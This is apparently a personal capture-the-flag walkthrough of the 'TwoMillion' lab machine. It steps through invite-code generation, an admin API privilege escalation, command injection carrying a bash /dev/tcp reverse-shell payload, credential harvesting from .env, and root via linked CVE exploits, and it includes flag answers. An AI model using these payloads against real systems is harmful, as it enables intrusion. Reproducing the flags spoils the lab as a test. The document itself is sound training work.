## Guided Mode:
**Q:** How many TCP ports are open?<br>
**A:** 2 <br>
`nmap -Pn -sV -T4 -O <IP>` <br> 
>(also indicated redirect to http://2Million.htb , so add it to /etc/hosts)<br>

**Q:** What is the name of the JavaScript file loaded by the /invite page that has to do with invite codes?<br>
**A:** inviteapi <br>
>Open http://2Million.htb/invite ,  `F12 -> Debugger`,<br> it reveals "js" folder that contain `inviteapi.min.js`<br>

**Q:** What JavaScript function on the invite page returns the first hint about how to get an invite code? Don't include () in the answer.<br>
**A:** makeInviteCode
>By going to "http://2million.htb/js/inviteapi.min.js" there's functions lists:<br>
>**'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'**<br>                                                                                                                                    
>Open http://2Million.htb/invite ->`F12`->`console`,<br> type makeInviteCode() , it will return:
```
Object { 0: 200, success: 1, data: {…}, hint: "Data is encrypted ... We should probbably check the encryption type in order to decrypt it..." }
0: 200
data: Object { data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr", enctype: "ROT13" }
​data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr"
​enctype: "ROT13" 
```

**(Alternative)**-> [Beautifier.io](https://beautifier.io/) -> paste in the code from "http://2million.htb/js/inviteapi.min.js"<br> and make sure to select "Detect packers and obfuscators? (unsafe)"
>we'll get 2 urls:
 > url-1: `/api/v1/invite/verify`,<br>
 > url-2: `/api/v1/invite/how/to/generate`,<br>`curl -X POST http://2million.htb/api/v1/invite/how/to/generate`

>[Cyber-Chef](https://gchq.github.io/CyberChef/) <-- help with decrypting ROT13<br>
>results:
>"  In order to generate the invite code, make a POST request to `/api/v1/invite/generate`<br> 
>`curl -X POST http://2million.htb/api/v1/invite/generate`

>we should get: {"0":200,"success":1,"data":{"code":"WFdYNzgtRjQzNU4tUTJSOVMtUU0wSlY=","format":"encoded"}}<br>                                                                             
>                                                       its base64, decoded: XWX78-F435N-Q2R9S-QM0JV

**Q:** The endpoint in makeInviteCode returns encrypted data. That message provides another endpoint to query. That endpoint returns a code value that is encoded with what very common binary to text encoding format. What is the name of that encoding?<br>
**A:** base64<br>

**Q:** What is the path to the endpoint the page uses when a user clicks on "Connection Pack"?<br>
**A:** /api/v1/user/vpn/generate<br>
>Can be seen while browsing the site at "http://2million.htb/home/access"

**Q:** How many API endpoints are there under /api/v1/admin?<br>
**A:** 3 <br>
`curl -sv http://2million.htb/api/v1 --cookie "PHPSESSID=uqa2uf1v7hkjk6q3pda7301h95" | jq`<br>

**Q:** What API endpoint can change a user account to an admin account?<br>
**A:** /api/v1/admin/settings/update <br>
>(Don't forget content-type: application/json) , on this api it said in the response "is_admin":0 ,<br>
so i made request with <br>
`{ "email":"testy@gmail.com", "is_admin":1 }`<br>, and then double-checked with "/api/v1/admin/auth".

**Q:** What API endpoint has a command injection vulnerability in it?<br>
**A:** /api/v1/admin/vpn/generate<br>
>For some reason the api asked for "username" in the json request but never checked if its a valid one,<br> so the payload looked like this:<br>
`{"username":"testy@gmail.com$(bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1')"} `<br>

**Q:** What file is commonly used in PHP applications to store environment variable values?<br>
**A:** .env<br>
>Once shell obtained, it was on the same directory i spawned in,<br> just had to do `ls -la`, it contains "DB-user\pass" for user.<br>

**Q:** Submit the flag located in the admin user's home directory.<br>
**A:** 4c348452d176af48561431b89a9c9e75<br>
>I've uploaded linpeas.sh , the scan showed :
>`DB_USERNAME=admin , DB_PASSWORD=SuperDuperPass123`--> ssh login and got the first flag.<br>

**Q:** What is the email address of the sender of the email sent to admin?<br>
**A:** ch4p@2million.htb<br>
>linpeas also indicated this:<br> admin    admin         540 Jun  2  2023 /var/mail/admin     <--- its here 
>                              admin    admin         540 Jun  2  2023 /var/spool/mail/admin

**Q:** What is the 2023 CVE ID for a vulnerability in that allows an attacker to move files in the Overlay file system while maintaining metadata like the owner and SetUID bits?<br>
**A:** CVE-2023-0386<br>
>Hint said: "linux vulnerability fuse overlayfs"<br>

**Q:** Submit the flag located in root's home directory.<br>
**A:** 79c46e6cfbbaa34264a78128aea15ac0
>[CVE-2023-0386](https://github.com/xkaneiki/CVE-2023-0386/) <-- it does get stuck after execute 2 first commands,<br> > relogin and execute the third.

**Q:** vuln glib version<br>
**A:** 2.35<br>

**Q:** vuln lib name <br>
**A:** GLIBC_TUNABLES

### ALTERNATIVE PRIV ESC
[CVE-2023-4911](https://haxx.in/files/gnu-acme.py)    OR [From Github](https://github.com/hadrian3689/looney-tunables-CVE-2023-4911)

